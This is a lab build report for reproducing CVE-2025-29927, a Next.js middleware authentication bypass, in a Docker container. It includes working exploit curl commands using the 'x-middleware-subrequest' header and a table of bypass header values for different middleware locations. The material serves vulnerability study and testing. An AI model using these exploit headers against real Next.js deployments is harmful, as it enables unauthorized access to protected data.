# Lab Build Report: CVE-2025-29927

## Lab Architecture

**Single-container lab** — Next.js is a self-contained Node.js application with no external database or service dependencies. The vulnerability is in the HTTP request handling layer (middleware sandbox), so only a Next.js server is needed.

### Container Topology

```
┌──────────────────────────────────────┐
│  cve-2025-29927-vulnerable           │
│  Next.js 14.2.24 (node:18-slim)     │
│  Port 3000                           │
│  Middleware: auth check on /api/*    │
└──────────────────────────────────────┘
```

## Container Details

| Property | Value |
|---|---|
| **Container Name** | `cve-2025-29927-vulnerable` |
| **Image** | `cve-2025-29927-vulnerable` (built from `Dockerfile.vulnerable`) |
| **Base Image** | `node:18-slim` |
| **Internal Port** | 3000 |
| **Host Port Mapping** | 3100 → 3000 |
| **Networks** | `lab-net` |
| **Next.js Version** | 14.2.24 (vulnerable) |
| **Patched Version** | 14.2.25 |

## Application Structure

```
vulnerable-app/
├── package.json                     # next@14.2.24, react@^18, react-dom@^18
├── middleware.js                     # Auth-checking middleware (vulnerable component)
├── app/
│   ├── layout.js                    # Root layout
│   ├── page.js                      # Public home page
│   └── api/
│       └── protected/
│           └── route.js             # Protected API endpoint
```

### Middleware Logic (`middleware.js`)

The middleware checks for `Authorization: Bearer my-secret-token` on all `/api/*` routes. Requests without a valid token receive `401 Unauthorized`. This middleware is the target of the bypass.

### Protected Endpoint (`/api/protected`)

Returns JSON with a secret message and flag when accessed. Should only be reachable with valid auth, but can be accessed without auth via the bypass header.

## Build Status

| Step | Status | Notes |
|---|---|---|
| Docker image build | ✅ Success | `next@14.2.24` installed from npm with `--force` to bypass audit warnings |
| Next.js build | ✅ Success | Production build compiled successfully, middleware detected (26.5 kB) |
| Container start | ✅ Success | Container running, serving on port 3000 |
| Health check | ✅ Healthy | Responds to HTTP requests on `/` |

## Verification Results

### Test 1: Unauthenticated Request (Baseline)
```
curl http://<container-ip>:3000/api/protected
→ HTTP 401: {"error":"Unauthorized"}
```
✅ Middleware correctly blocks unauthenticated access.

### Test 2: Authenticated Request (Positive Control)
```
curl -H "Authorization: Bearer my-secret-token" http://<container-ip>:3000/api/protected
→ HTTP 200: {"message":"SUCCESS: You have accessed the protected API endpoint","secret":"This data should only be visible to authenticated users","flag":"CVE-2025-29927-middleware-bypass"}
```
✅ Middleware correctly allows authenticated access.

### Test 3: Exploit — Middleware Bypass (CVE-2025-29927)
```
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://<container-ip>:3000/api/protected
→ HTTP 200: {"message":"SUCCESS: You have accessed the protected API endpoint","secret":"This data should only be visible to authenticated users","flag":"CVE-2025-29927-middleware-bypass"}
```
✅ **VULNERABILITY CONFIRMED** — Middleware bypassed without any authentication.

## Start/Stop Commands

```bash
# Start lab
docker compose up -d

# Check status
docker compose ps

# View logs
docker compose logs vulnerable

# Stop lab
docker compose down
```

## Accessing the Vulnerable Container

From the host machine (port 3100 is mapped to container port 3000):

```bash
# Test endpoints
curl http://localhost:3100/                    # Public page
curl http://localhost:3100/api/protected       # Protected (401)

# Exploit
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  http://localhost:3100/api/protected           # Bypass (200)
```

## Exploit Vectors

The following header values bypass middleware in this lab:

| Vector | Header Value | Notes |
|---|---|---|
| Standard (root middleware) | `middleware:middleware:middleware:middleware:middleware` | Default middleware location |
| src/ directory | `src/middleware:src/middleware:src/middleware:src/middleware:src/middleware` | For apps using `src/` directory |
| Universal | `middleware:middleware:middleware:middleware:middleware:src/middleware:src/middleware:src/middleware:src/middleware:src/middleware:pages/_middleware` | Covers all middleware locations |

## Known Issues

- **None.** The lab builds and runs cleanly. The vulnerability is trivially reproducible with a single curl command.
- The `node:18-slim` base image does not include `curl`, so the Docker healthcheck relies on the curl installed in the image. If healthcheck fails, add `RUN apt-get update && apt-get install -y curl` to the Dockerfile.

## Files

| File | Path | Purpose |
|---|---|---|
| Dockerfile.vulnerable | `Dockerfile.vulnerable` | Builds vulnerable Next.js 14.2.24 container |
| docker-compose.yml | `docker-compose.yml` | Orchestrates the lab |
| package.json | `vulnerable-app/package.json` | App dependencies |
| middleware.js | `vulnerable-app/middleware.js` | Vulnerable auth middleware |
| app/api/protected/route.js | `vulnerable-app/app/api/protected/route.js` | Protected API endpoint |
| app/layout.js | `vulnerable-app/app/layout.js` | Root layout |
| app/page.js | `vulnerable-app/app/page.js` | Public home page |
